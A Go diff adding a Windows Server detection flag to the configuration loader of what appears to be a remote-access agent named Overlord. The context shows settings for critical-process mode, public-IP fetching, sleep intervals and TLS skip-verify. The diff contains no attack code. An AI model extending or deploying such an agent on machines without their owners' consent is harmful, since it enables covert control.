@@ -37,6 +37,7 @@ var DefaultCriticalProcess = "false"
 var DefaultFetchPublicIP = "false"
 var DefaultSecureLogPublicKey = ""
 var DefaultTLSSPKIPins = ""
+var DefaultWindowsServerOptimized = "false"
 
 const settingsFile = "config/settings.json"
 const serverIndexFile = "config/server_index.json"
@@ -79,6 +80,7 @@ type Config struct {
 	BuildTag              string
 	SleepSeconds          int
 	FetchPublicIP         bool
+	WindowsServerOptimized bool
 }
 
 func Load() Config {
@@ -181,6 +183,14 @@ func Load() Config {
 		fetchPublicIP = isTruthy(v)
 	}
 
+	windowsServerOptimized := isTruthy(DefaultWindowsServerOptimized)
+	if v := strings.TrimSpace(overlordenv.Getenv("OVERLORD_WINDOWS_SERVER")); v != "" {
+		windowsServerOptimized = isTruthy(v)
+	}
+	if !windowsServerOptimized && runtime.GOOS == "windows" {
+		windowsServerOptimized = isWindowsServerOS()
+	}
+
 	tlsInsecureSkipVerify := false
 	if v := strings.ToLower(strings.TrimSpace(overlordenv.Getenv("OVERLORD_TLS_INSECURE_SKIP_VERIFY"))); v != "" {
 		tlsInsecureSkipVerify = v == "true" || v == "1" || v == "yes"
@@ -233,6 +243,7 @@ func Load() Config {
 		BuildTag:              strings.TrimSpace(DefaultBuildTag),
 		SleepSeconds:          parseSleepSeconds(DefaultSleepSeconds),
 		FetchPublicIP:         fetchPublicIP,
+		WindowsServerOptimized: windowsServerOptimized,
 	}
 }
 
